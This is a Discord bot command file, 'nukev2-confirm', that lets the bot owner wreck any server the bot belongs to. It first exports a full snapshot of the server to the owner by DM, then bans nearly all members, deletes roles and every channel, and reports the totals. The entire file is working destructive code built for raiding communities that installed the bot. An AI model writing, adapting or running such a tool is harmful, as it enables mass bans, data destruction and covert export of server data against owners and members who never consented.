import { EmbedBuilder } from 'discord.js';
import { saveServerSnapshot, storeNukeSnapshot } from '../../utils/nukeSnapshots.js';
import { botConfig } from '../../config/botConfig.js';
import { logger } from '../../utils/logger.js';

export default {
    name: 'nukev2-confirm',
    async execute(interaction, client, args) {
        if (!botConfig.commands.owners.includes(interaction.user.id)) {
            return interaction.reply({ content: '❌ Only the bot owner can confirm this.', ephemeral: true });
        }

        const guildId = args[0];
        const issuerId = args[1];
        if (guildId === '1412267331266281593') return interaction.reply({ content: '🛡️ This server is protected and cannot be nuked.', ephemeral: true });
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return interaction.reply({ content: '❌ Could not find the server.', ephemeral: true });

        await interaction.update({ components: [] });

        // Save snapshot + DM to owner
        const snapshot = await saveServerSnapshot(guild);
        storeNukeSnapshot(guild.id, snapshot);
        try {
            const json = JSON.stringify(snapshot, null, 2);
            await interaction.user.send({
                content: `☢️ **Full snapshot before NUKEV2 of \`${guild.name}\`**`,
                files: [{ attachment: Buffer.from(json), name: `${guild.name.replace(/[^a-z0-9]/gi, '_')}-snapshot.json` }],
            });
        } catch (e) { logger.warn('Could not DM snapshot before nukev2:', e.message); }

        let membersBanned = 0, rolesDeleted = 0, channelsDeleted = 0;

        await guild.members.fetch().catch(() => {});

        for (const [, m] of guild.members.cache) {
            if (m.id === client.user.id || m.id === issuerId) continue;
            try { await guild.members.ban(m.id, { reason: 'Nuke v2', deleteMessageSeconds: 0 }); membersBanned++; }
            catch {}
        }

        const roles = [...guild.roles.cache.values()]
            .filter(r => !r.managed && r.id !== guild.id)
            .sort((a, b) => a.position - b.position);
        for (const r of roles) {
            if (r.position >= guild.members.me.roles.highest.position) continue;
            await r.delete('Nuke v2').catch(() => {});
            rolesDeleted++;
        }

        for (const [, ch] of guild.channels.cache) {
            await ch.delete('Nuke v2').catch(() => {});
            channelsDeleted++;
        }

        const summary = `☢️ **Full Nuke V2 complete** on **${guild.name}**\n\n👥 Banned: **${membersBanned}** members\n🎭 Deleted: **${rolesDeleted}** roles\n📁 Deleted: **${channelsDeleted}** channels`;
        await interaction.user.send({ embeds: [new EmbedBuilder().setColor(0xED4245).setDescription(summary).setTimestamp()] }).catch(() => {});
    },
};
